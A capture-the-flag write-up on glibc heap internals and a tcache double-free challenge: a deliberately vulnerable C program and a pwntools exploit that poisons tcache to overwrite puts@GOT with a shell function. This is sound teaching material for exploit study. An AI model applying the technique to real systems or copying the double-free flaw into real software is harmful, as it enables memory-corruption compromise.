---
title: "- Heap Tcachedup"
tags:
  - Pwn
  - CTF
  - heap
---

## 1. Chunks: The Basic Building Blocks

```md
Allocated Chunk:       Free Chunk:
+--------------+      +--------------+
| size + flags |      | size + flags |
+--------------+      +--------------+
|  user data   |      |     fd       |
+--------------+      +--------------+
```
- Size indicates chunk length  
- Flags track whether neighbors are in use  
- Freed chunks store pointers in user data  

## Tcache (Thread Cache)
`tcache_bins[0x20]: A->B->C->NULL`

The fast-food drive-thru of heap memory:

- First place malloc checks
- Max 7 chunks per size
- Limited to small sizes
- Fastest allocation method

## BINS 

```md
fast bins:  Quick access (like tcache)
small bins: Fixed sizes
large bins: Variable sizes
```

Different waiting lines for chunks:

- Each handles different sizes
- Organized by size class
- More complex but more robust than tcache

## TOP CHUNK 

```
+-------------+
|other chunks |
+-------------+
| TOP CHUNK   | <- grows/shrinks as needed
+-------------+
```

Like a bank's reserve money:

- Last chunk in heap
- Used when no other chunks available
- Can grow to satisfy large requests

## FD  (Forward Pointer)

`free_chunk->fd = next_free
A->B->NULL`

The chain that links free chunks:

- Points to next free chunk of same size
- NULL marks end of chain
- Critical for managing free lists

## CHUNK FLAGS

`P (0x1): Previous in use`
`M (0x2): Is Mmap'd`
`N (0x4): Non-main arena`

Status tags on chunks:

- Stored in last 3 bits of size
- Help manage chunk states
- Critical for coalescing

## MALLOC FLOW 

```md
check tcache -> check bins -> use top chunk
     ↓            ↓              ↓
  fastest      medium         slowest
```

# Problem Code 

```c
// gcc -o tcache_dup tcache_dup.c -no-pie
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

char *ptr[10];

void alarm_handler() {
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

int create(int cnt) {
    int size;

    if (cnt > 10) {
        return -1;
    }
    printf("Size: ");
    scanf("%d", &size);

    ptr[cnt] = malloc(size);

    if (!ptr[cnt]) {
        return -1;
    }

    printf("Data: ");
    read(0, ptr[cnt], size);
}

int delete() {
    int idx;

    printf("idx: ");
    scanf("%d", &idx);

    if (idx > 10) {
        return -1;
    }

    free(ptr[idx]);
}

void get_shell() {
    system("/bin/sh");
}

int main() {
    int idx;
    int cnt = 0;

    initialize();

    while (1) {
        printf("1. Create\n");
        printf("2. Delete\n");
        printf("> ");
        scanf("%d", &idx);

        switch (idx) {
            case 1:
                create(cnt);
                cnt++;
                break;
            case 2:
                delete();
                break;
            default:
                break;
        }
    }

    return 0;
}

```

- You can allocate chunks of any size you want through 1.
- You can free a chunk through step 2, but the Double Free Bug occurs because the chunk is not initialized after being freed.

```
1. INITIAL STATE (After allocating two chunks of size 0x20)

ptr array
[0]         [1]      [2]...
 |           | 
 v           v

+------------+ +------------+ +------------+
| size=0x21  | | size=0x21  | | TOP CHUNK |
+------------+ +------------+ +------------+
|   "AAAA"   | |   "BBBB"   | |           |
+------------+ +------------+ +------------+
 Chunk 0       Chunk 1
 0x602250      0x602260      0x602270


2. AFTER FIRST TWO FREES (Normal state)
======================================
ptr array
[0]         [1]      [2]...
 |           | 
 v           v

+------------+ +------------+ +------------+
| size=0x21  | | size=0x21  | | TOP CHUNK |
+------------+ +------------+ +------------+
|    fd      | |    fd      | |           |
|    → 0     | |    →       | |           |
+------------+ +------------+ +------------+
 Chunk 0       Chunk 1
 0x602250      0x602260      0x602270
 (freed)       (freed)


3. AFTER DOUBLE FREE (Corrupted state)
====================================
ptr array
[0]         [1]      [2]...
 |           | 
 v           v

+------------+ +------------+ +------------+
| size=0x21  | | size=0x21  | | TOP CHUNK |
+------------+ +------------+ +------------+
|    fd      | |    fd      | |           |
|  →─────────| | ←───────── | |           |
+------------+ +------------+ +------------+
 Chunk 0       Chunk 1
 0x602250      0x602260      0x602270
 (freed twice) (freed)

tcache_bins[0x20]: 0x602260 <-> 0x602260 (circular link)      

tcache_bins[0x20]:
0x602260 ←→ 0x602260 (circular link!)
``` 
## EXPLOIT CODE 
```python
#!/usr/bin/python3
from pwn import *

p = process("./tcache_dup_patched")

e = ELF("./tcache_dup_patched")


get_shell = e.symbols['get_shell']
puts_got = e.got['puts']


def slog(symbol, addr):
    return success(symbol + ": " + hex(addr))


def create(size, data):
    p.sendlineafter("> ", "1")
    p.sendlineafter("Size: ", str(size))
    p.sendafter("Data: ", data)


def delete(idx):
    p.sendlineafter("> ", "2")
    p.sendlineafter("idx: ", str(idx))


# Double Free
create(0x10, "dreamhack")
delete(0)
delete(0)


# Overwrite puts@got -> get_shell
create(0x10, p64(puts_got))
create(0x10, 'A'*8)
create(0x10, p64(get_shell))

p.interactive()


```

- We allocate a single chunk (index 0).
- Free it twice, creating a circular pointer in tcache.
- We then allocate new chunks that manipulate the tcache list to overwrite `puts@GOT` with `get_shell`, gaining a shell.